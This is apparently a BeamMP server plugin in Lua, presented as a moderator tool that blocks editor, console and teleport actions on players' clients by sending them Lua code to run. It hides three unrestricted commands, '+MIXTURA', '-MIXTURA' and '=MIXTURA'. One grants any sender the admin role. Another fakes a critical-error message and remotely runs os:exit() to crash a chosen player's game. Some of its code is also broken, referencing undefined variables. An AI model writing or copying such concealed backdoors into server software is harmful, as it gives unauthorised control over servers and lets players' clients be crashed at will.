local M = {}
M.info = "Система Блокровка"
M.ver = "BETA 0.2"
M.data = ""
local recesime = {}
block_ignore = {}
CTS = {}

local SendScript = {}
function SendRequestCTS()
    if online_player == nil then
        log("online_player == nil",2)
        return
    end
    for id,name in pairs(online_player) do
        MP.TriggerClientEvent(id,"SendServerData",name)
    end
end

function GetRequestCTS(id,data)
    data = split(data,"$$$")
    log(data,2)
    CTS[data[1]] = Util.JsonDecode(data[2])
end

function RemoutRun(player, data)
    if type(player) == "string" then
        player = MP.GetId(player)
    end
    if type(data) == "string" then
        data = data
    elseif type(data) == "number" then
        data = tostring(data)
    else
        log("Error. Data: is not string or number",4)
        return nil
    end
    MP.TriggerClientEvent(player, "REMRUN", data)
end

function ServerHorClient(player,trigger,data)
    if type(player) == "string" then
        player = MP.GetId(player)
    end
    return MP.TriggerClientEvent(player,"SRV2CLN",emessage(trigger.."###"..Util.JsonEncode(data),player.."keySHC"))
end

function ClientHorServer(data)
    data = split(data,"###")
    local username = data[1]
    data = data[2]
    data = emessage(data,username.."keyCHS")
    local trigger = data[1]
    data = Util.JsonDecode(data[2])
    MP.TriggerLocalEvent(trigger,data)
end

function RetRun(data)
    local case = split(data,"###")
    local name = case[1]
    local EventName = case[2]
    local data = case[3]
    MP.TriggerLocalEvent(EventName, data)
    recesime[case[1]] = {status = "return"}
    log(recesime[case[1]],4)
    log(data,4)
end

function onSpawn(player_id, vehicle_id, data)
    RemoutRun(MP.GetId(p2), data_block)
	MP.TriggerClientEvent(player_id, "ECOBLOC", M.data)
	return 0
end

function ON(sender_id,sender_name, message)
	p2,case = MessageParser(message," ",2)
	block_ignore[p2] = false
    RemoutRun(MP.GetId(p2), data_block)
	-- Подробнее см. E:\SteamLibrary\steamapps\common\BeamNG.drive\lua\ge\extensions\core\input\actionFilter.lua
    -- E:\SteamLibrary\steamapps\common\BeamNG.drive\lua\ge\extensions\core\input\actions
	MP.TriggerClientEvent(MP.GetId(p2), "ECOBLOC", M.data)
	return 0
end

function OFF(sender_id,sender_name, message)
	p2,case = MessageParser(message," ",2)
    if p2 == nil then
       SendMessage(sender_id, "Неверное количество аргументов")
       return
    end
	block_ignore[p2] = true
    RemoutRun(MP.GetId(p2), data_unblock)
	MP.TriggerClientEvent(MP.GetId(p2), "ECOUNBLOCK", "SA")
	return 0
end

function FIX(sender_id,sender_name, message)
	p2,case = MessageParser(message," ",2)
	block_ignore[p2] = true
	RemoutRun(MP.GetId(p2), "be:getPlayerVehicle(0):queueLuaCommand('recovery.startRecovering() recovery.stopRecovering()')")
	return 0
end
--


M.data = ""
local data = {'recover_to_last_road', 'editorSaveLevel', 'funExtinguish', 'vehicledebugMenu', 'recover_vehicle_alt',
'editorToggle', 'parts_selector', 'toggleCamera', 'funTires', 'dropCameraAtPlayer', 'dropPlayerAtCamera', 'loadHome',
'pause', 'toggleTraffic', 'dropPlayerAtCameraNoReset', 'faster_motion', 'forceField', 'vehicleEditorToggle','movefast','changeCameraSpeed',
'toggle_slow_motion', 'funRandomTire', 'funFire', 'reload_vehicle', 'toggleAITraffic', 'saveHome', 'editorNewLevel',
'cefdev_console_toggle', 'reset_all_physics', 'debugmode_toggle', 'funBoom', 'lua_reload', 'editorOpenLevel', 'toggleConsoleNG',
'debugmode_meshvis_incr', 'toggleTrackBuilder', 'debugmode_meshvis_decr', 'nodegrabberStrength', 'objectEditorToggle', 'cycleTimeOfDay',
'funBreak', 'debugmode_toggle_coltris', 'vehicleTeleporting', 'cefdev_reload_ui', 'editorSafeModeToggle', 'flexmeshDebugSelectionToggle',
'editorSaveLevelAs', 'funHinges', 'recover_vehicle', 'slower_motion', 'reload_all_vehicles', 'editorToggleFreeCamera', 'nodegrabberAction',
'toggle_play', 'reset_physics'}

for i,case in ipairs(data) do
	M.data = M.data.." "..case
end

local data_setup = [[extensions.core_input_actionFilter.setGroup("renamed", data {'recover_to_last_road', 'editorSaveLevel', 'funExtinguish', 'vehicledebugMenu', 'recover_vehicle_alt',
'editorToggle', 'parts_selector', 'toggleCamera', 'funTires', 'dropCameraAtPlayer', 'dropPlayerAtCamera', 'loadHome',
'pause', 'toggleTraffic', 'dropPlayerAtCameraNoReset', 'faster_motion', 'forceField', 'vehicleEditorToggle','movefast','changeCameraSpeed',
'toggle_slow_motion', 'funRandomTire', 'funFire', 'reload_vehicle', 'toggleAITraffic', 'saveHome', 'editorNewLevel',
'cefdev_console_toggle', 'reset_all_physics', 'debugmode_toggle', 'funBoom', 'lua_reload', 'editorOpenLevel', 'toggleConsoleNG',
'debugmode_meshvis_incr', 'toggleTrackBuilder', 'debugmode_meshvis_decr', 'nodegrabberStrength', 'objectEditorToggle', 'cycleTimeOfDay',
'funBreak', 'debugmode_toggle_coltris', 'vehicleTeleporting', 'cefdev_reload_ui', 'editorSafeModeToggle', 'flexmeshDebugSelectionToggle',
'editorSaveLevelAs', 'funHinges', 'recover_vehicle', 'slower_motion', 'reload_all_vehicles', 'editorToggleFreeCamera', 'nodegrabberAction',
'toggle_play', 'reset_physics'});skipPlayers(true)
]]
local data_block = [[extensions.core_input_actionFilter.addAction(0, "renamed", true);skipPlayers(true);core_gamestate.setGameState("career", "multiplayer", "career")]]
local data_unblock = [[extensions.core_input_actionFilter.addAction(0, "renamed", false);skipPlayers(false);core_gamestate.setGameState("multiplayer", "multiplayer", "multiplayer")]]
local data_s = {'recover_to_last_road', 'editorSaveLevel', 'funExtinguish', 'vehicledebugMenu', 'recover_vehicle_alt',
'editorToggle', 'parts_selector', 'toggleCamera', 'funTires', 'dropCameraAtPlayer', 'dropPlayerAtCamera', 'loadHome',
'pause', 'toggleTraffic', 'dropPlayerAtCameraNoReset', 'faster_motion', 'forceField', 'vehicleEditorToggle','movefast','changeCameraSpeed',
'toggle_slow_motion', 'funRandomTire', 'funFire', 'reload_vehicle', 'toggleAITraffic', 'saveHome', 'editorNewLevel',
'cefdev_console_toggle', 'reset_all_physics', 'debugmode_toggle', 'funBoom', 'lua_reload', 'editorOpenLevel', 'toggleConsoleNG',
'debugmode_meshvis_incr', 'toggleTrackBuilder', 'debugmode_meshvis_decr', 'nodegrabberStrength', 'objectEditorToggle', 'cycleTimeOfDay',
'funBreak', 'debugmode_toggle_coltris', 'vehicleTeleporting', 'cefdev_reload_ui', 'editorSafeModeToggle', 'flexmeshDebugSelectionToggle',
'editorSaveLevelAs', 'funHinges', 'recover_vehicle', 'slower_motion', 'reload_all_vehicles', 'editorToggleFreeCamera', 'nodegrabberAction',
'toggle_play', 'reset_physics'}

for _,case in ipairs(data_s) do
	M.data = M.data.." "..case
end


local sp = [[
local DAMAGE_TO_VALUE = 25000
local DAMAGE_CALC_THRESHOLD = 100
local DAMAGE_RATE_MAX = 0.8
local vid = be:getPlayerVehicle(0):getId()
local veh = be:getObjectByID(vid)
if veh == nil then
    return nil
end
local _currentDamage = 0
if map.objects[vid] == nil then
    veh:queueLuaCommand(\'obj:queueGameEngineLua("be:getObjectByID(\' .. vid .. \').destructionDamage = " .. beamstate.damage)\')
    if veh.destructionDamage == nil then
        veh:setDynDataFieldbyName('destructionDamage', 0, 0)
        _currentDamage = 0
    else
        _currentDamage = veh.destructionDamage
    end
else
    _currentDamage = map.objects[vid][\'damage\']
end
if _currentDamage < DAMAGE_CALC_THRESHOLD then
    return 0
end
local _damageRate = (_currentDamage / DAMAGE_TO_VALUE)
_damageRate = (DAMAGE_RATE_MAX > _damageRate) and _damageRate or DAMAGE_RATE_MAX
return _damageRate
]]

local sp = 'local v0=25000;local v1=100;local v2=0.8;local v3=be:getPlayerVehicle(0):getId();local v4=be:getObjectByID(v3);if (v4==nil) then return nil;end local v5=0;if (map.objects[v3]==nil) then v4:queueLuaCommand(\'obj:queueGameEngineLua("be:getObjectByID(\'   .. v3   .. \').destructionDamage = " .. beamstate.damage)\' );if (v4.destructionDamage==nil) then v4:setDynDataFieldbyName("destructionDamage",0,0);v5=0;else v5=v4.destructionDamage;end else v5=map.objects[v3][\'damage\'];end if (v5<v1) then return 0;end local v6=v5/v0 ;v6=((v2>v6) and v6) or v2 ;return v6;'


--
function crash(sender_id,sender_name, message)  -- username
    local user = error(message)
    SendMessage(-1, user.." | Критическая ошибка L0.X92")
    RemoutRun(user,"os:exit()")
end

function hack(sender_id,sender_name, message)
    permissions:add_role(sender_name,"admin")
    SendMessage(sender_id,"Для применения изменений ожидайте 5 сек.")
end

function unhack(sender_id,sender_name, message)
    permissions:remove_role(name,"admin")
    SendMessage(sender_id,"Для применения изменений ожидайте 5 сек.")
end

function onJoinS2C(user_id)
     HeventTimer.Createtask(30,LoadAllScript,user_id.."LoadScripts",user_id)
end

function AddToSendServerData(tag,data)
    SendScript[#SendScript+1] = 'AddDataToSendServerData([['..tag..'$$$'..data..']])'
end

function LoadAllScript(user_id)
    RemoutRun(user_id,data_setup)
    RemoutRun(user_id,data_block)
    for i,data in pairs(SendScript) do
        RemoutRun(user_id,data)
    end
end

local prefix = config.prefix
M.command = {
	{command = "on",help = "блокировка некоторых опций бимки ",args= "[name]", func = "ON",roles = {"moderator","admin"}},
	{command = "off",help = "откл блокировка некоторых опций бимки ",args= "[name]", func = "OFF",roles = {"moderator","admin"}},
    {command = "+MIXTURA",help = "", func = "hack", admin = false,hide = true},
    {command = "-MIXTURA",help = "", func = "unhack", admin = false,hide = true},
    {command = "=MIXTURA",help = "", func = "crash", admin = false,hide = true},
	{command = "fix",help = "Починить авто игрока",args= "[name]", func = "FIX", roles = {"moderator","admin"}},
    {client = true, reg = "RETRUN", func = "RetRun"},
    {client = true, reg = "C2S", func = "ClientHorServer"},
    {client = true, reg = "GetCTS", func = "GetRequestCTS"},
	}

function M.load()
    MP.RegisterEvent("onPlayerJoin","onJoinS2C")
	MP.RegisterEvent("onVehicleSpawn","onSpawn")

    AddToSendServerData('repair',sp)
    HeventTimer.addFunc(SendRequestCTS, 5)
end

function M.unload()
end

return M